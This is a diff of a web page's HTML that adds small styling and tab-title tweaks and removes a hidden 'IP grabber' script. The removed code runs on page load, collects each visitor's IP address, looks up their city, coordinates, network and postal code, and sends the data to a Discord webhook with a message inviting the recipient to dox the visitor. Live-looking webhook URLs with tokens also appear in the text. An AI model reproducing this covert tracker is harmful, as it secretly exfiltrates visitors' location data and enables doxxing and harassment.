@@ -31,7 +31,8 @@
       cursor: pointer;
     }
 
-    button:hover {
+    button:hover { 
+      transition: all 0.2s ease-in-out;
       background-color: #065566;
     }
 
@@ -106,104 +107,14 @@
     };
 </script>
 <script>
-  // getting ip bcuz why not
-    async function getIP(json) {
-        const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
+  window.addEventListener("blur", () => {
+    document.title = "nooo come back :(";
+  });
 
-        ignoredIps = ['122.173.31.1'];
-
-        if (ignoredIps.includes(json.ip)) {
-            return;
-        }
-
-        try {
-            const locationInfo = await getLocation(json.ip);
-
-            const data = {
-                "content": null,
-                "embeds": [
-                    {
-                        "title": "From IP Grabber:",
-                        "description": "The most recent logged-in user's location information are:\n",
-                        "color": 15431437,
-                        "fields": [
-                            {
-                              "name": "IP:",
-                              "value": json.ip
-                            },
-                            {
-                                "name": "City:",
-                                "value": locationInfo.city
-                            },
-                            {
-                                "name": "Region:",
-                                "value": locationInfo.region
-                            },
-                            {
-                                "name": "Country:",
-                                "value": locationInfo.country
-                            },
-                            {
-                                "name": "Timezone:",
-                                "value": locationInfo.timezone
-                            },
-                            {
-                                "name": "Latitude:",
-                                "value": locationInfo.loc.split(",")[0]
-                            },
-                            {
-                                "name": "Longitude:",
-                                "value": locationInfo.loc.split(",")[1]
-                            },
-                            {
-                              "name": "Network:",
-                              "value": locationInfo.org
-                            },
-                            {
-                              "name": "Location:",
-                              "value": locationInfo.loc
-                            },
-                            {
-                              "name": "Postal Code:",
-                              "value": locationInfo.postal
-                            },
-                            {
-                                "name": "Now feel free to dox the living shit of that guy.",
-                                "value": "(or use it when you're about to lose an argument against him)"
-                            }
-                        ],
-                        "footer": {
-                            "text": `From ${window.location.href}`
-                        }
-                    }
-                ],
-                "attachments": []
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            });
-        } catch(error) {
-            console.error(error);
-        }
-    }
-
-  async function getLocation(ipAddress) {
-    const url = `http://ipinfo.io/${ipAddress}/json`;
-      try {
-          const response = await fetch(url);
-          const data = await response.json();
-          return data;
-      } catch (error) {
-          return null;
-      }
-  }
+  window.addEventListener("focus", () => {
+    document.title = "yayyyy :D";
+  });
 </script>
-<script src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
 <script>
   function sendTranslateRequest(userInput) {
     const webhookURL = 'https://discord.com/api/webhooks/1195384620485726349/pWyMAJkcgg5iyW8WAanY0VzY9HZoIVUo-6KkCKNdHncd68011Ecd_CGM_kByDjjTETID';
